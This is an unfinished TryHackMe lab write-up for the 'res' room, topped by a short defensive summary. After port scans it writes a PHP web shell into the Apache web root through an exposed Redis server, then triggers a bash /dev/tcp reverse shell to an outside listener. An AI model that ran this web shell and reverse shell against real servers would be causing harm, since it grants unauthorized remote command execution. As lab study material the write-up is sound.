# res

<!-- brain:report -->
- **Platform** TryHackMe
- **Difficulty** Easy
- **Source status** Limited detail

## Report overview

The observations in this case inform a review of service and share exposure and network segmentation.

## Defensive takeaways

- Confirm the intended audience for network services and shares, then compare their permissions and reachability with that policy.
- Compare cross-zone routes with the dependency map and audit access to management systems.

## Defensive references

- [Exposed service and share hardening](../../../defense/techniques/service-exposure-review.md)
- [Network segmentation and trust boundaries](../../../defense/techniques/network-segmentation.md)

<!-- /brain:report -->

---


**Platform:** TryHackMe  
**Difficulty:** Easy  
**Status:** Incomplete — Redis webshell foothold documented; privilege escalation/root still needs to be finished.

## Reconnaissance
```bash
nmap -sS -p- 10.128.149.49 -oN silent  
nmap -sVC -p22,80,6379 $TARGET -oN service 
```

**Output**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7d:42:5a:3f:37:d7:e6:c4:b2:e3:6b:8e:00:23:d9:38 (RSA)
|   256 2d:7e:5a:0c:c3:30:32:93:c2:30:b2:15:a5:0c:3b:3c (ECDSA)
|_  256 88:07:c7:68:7c:1e:3f:d7:69:e6:90:8b:4a:e4:24:39 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Fuzzing
```bash
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

## Redis-cli
### Upload a web shell
Tool note: [redis-cli](../../../tools/database/redis-cli.md). Full technique: [Redis webroot webshell](../../../exploits/network-services/redis-webroot-webshell.md).

```bash
redis-cli -h $TARGET -p 6379
INFO
CONFIG GET dir
CONFIG SET dir /var/www/html
FLUSHALL
SET shell "<?php\n\n\n\n system($_GET['cmd']);\n\n\n\n ?>"
SAVE
```

### Get a reverse shell
```bash
nc -lvnp 4444
curl "http://10.128.149.49/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.130.5/4444+0>%261'"
```

## Linux Enum
```bash
find / -perm -u=s 2>/dev/null
```

## Current Stopping Point

The writeup currently lands a shell through Redis writing into the Apache web root. It still needs post-exploitation enumeration, user/root flag capture, and any reusable privilege-escalation technique extracted once found.

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [gobuster](../../../tools/fuzz/gobuster.md)
- [redis-cli](../../../tools/database/redis-cli.md)
- [Redis webroot webshell](../../../exploits/network-services/redis-webroot-webshell.md)
- [bash reverse shell](../../../payloads/reverse-shells/bash-tcp.md)
